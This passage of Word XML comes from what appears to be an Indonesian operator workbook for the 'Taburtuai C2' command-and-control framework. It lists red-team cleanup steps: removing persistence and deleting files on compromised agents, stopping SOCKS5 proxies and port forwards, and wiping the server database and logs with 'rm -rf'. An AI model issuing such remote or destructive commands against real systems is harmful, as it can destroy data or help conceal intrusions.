        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>persistence list &lt;agent-id&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>persistence remove &lt;agent-id&gt; --method &lt;method&gt; --name &lt;name&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Hapus semua file yang di-upload.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "del C:\Temp\* /Q" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Stop semua SOCKS5 proxy dan port forward aktif.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>socks5 stop &lt;agent-id&gt; --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>portfwd list</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>portfwd stop &lt;sess-id&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Hapus agent dari database server.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>agents delete &lt;agent-id&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Stop server C2 dan hapus database engagement.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>rm data/taburtuai.db</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>rm -rf logs/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="400"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i/>
          <w:color w:val="BBBBBB"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>TABURTUAI C2  ·  OPERATOR WORKBOOK  ·  For Authorized Use Only</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